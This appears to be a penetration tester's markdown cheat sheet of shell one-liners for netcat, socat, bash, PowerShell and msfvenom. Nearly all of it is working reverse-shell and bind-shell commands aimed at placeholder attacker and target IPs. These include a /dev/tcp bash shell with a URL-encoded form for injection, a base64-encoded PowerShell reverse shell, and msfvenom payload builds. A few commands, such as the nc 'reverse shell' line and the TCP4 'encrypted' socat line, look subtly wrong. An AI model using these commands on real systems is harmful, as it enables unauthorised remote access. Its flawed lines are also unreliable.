- N.b. many commands below are being run as `sudo` to make use of a port in the `0-1024` range, since root is needed to bind a listener to a port `<1024`. Beyond this range this is not necessary.

## NETCAT

### Flags:
- `-n` Skip DNS resolution
- `-v` Verbose
- `-l` Create listener
- `-p <port number>` To specify port number

Create Listener:
```bash
nc -nlvp <port to listen on>
```
Make Connection:
```bash
nc -nv <IP address> <port>
```
Listen For File Transfer:
```bash
nc -nlvp <port> > incoming
```
Send File:
```bash
nc -nv <IP address> <port> < file/to/transfer
```
Create Bind Shell Windows:
```bash
nc -nlvp <port> -e cmd.exe
```
Send Reverse Shell Linux:
```bash
cat /tmp/f | /bin/sh -i 2>&1 | nc -nl 127.0.0.1 4444 > /tmp/f
```

## OTHER

### Simple Reverse Shell Linux:
```bash
bash -c "bash -i >& /dev/tcp/<OurIP>/4444 0>&1"
```
When you inevitably need to URL encode (https://meyerweb.com/eric/tools/dencoder/):
```bash
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<OurIP>%2F4444%200%3E%261%22
```
### Powershell Reverse Shell (Base64 Encoded):
```powershell
pwsh
$Text = '$client = New-Object System.Net.Sockets.TCPClient("<attacker IP>",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
```
```bash
powershell -enc <our Base64 encoded Powershell revshell>
```
### msfvenom
For when your existing shell is kinda shit, upgrade it to an msfvenom one: https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
Linux:
```bash
msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```
Windows:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

## SOCAT

- N.b. Whenever we execute a shell we use `/bin/bash` if our target is a Linux machine, this must be substituted for `'cmd.exe', pipes` for Windows.

### Bind Shell:
Set up our listener on the target, which will deliver a shell to anyone who tries to make a connection
```bash
sudo socat -d -d TCP4-LISTEN:443 EXEC:/bin/bash
```
Now just connect with the target
```bash
socat - TCP4:<target IP>:443
```
### Reverse Shell:
Create listener on our machine
```bash
sudo socat -d -d TCP4-LISTEN:443 STDOUT
```
Send shell from target machine
```bash
socat TCP4:<attacker IP>:443 EXEC:/bin/bash
```
### File Transfer (Attacker to Target):
Prepare listener on source that will send the file to any machine that makes a connection
```bash
sudo socat TCP4-LISTEN:443,fork file:<filename>
```
Connect to source from target
```bash
socat TCP4:<IP address>:443 file:<received filename>,create
```
### Generate .pem:
Generate certificate on target machine
```bash
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```
Create .pem from keyfile and certificate
```bash
cat shell.key shell.crt > shell.pem
```
### Encrypted Bind Shell:
Begin listening for attempts to connect, and deliver a shell to anyone who tries
```bash
sudo socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0,fork EXEC:/bin/bash
```
Connect like so
```bash
socat - OPENSSL:<target IP>:443,verify=0
```
### Encrypted Reverse Shell:
Create listener on our machine
```bash
sudo socat -d -d OPENSSL-LISTEN:443,cert=shell.pem,verify=0,fork STDOUT
```
Send shell from target machine
```bash
socat TCP4:<attacker IP>:443, verify=0 EXEC:/bin/bash
```
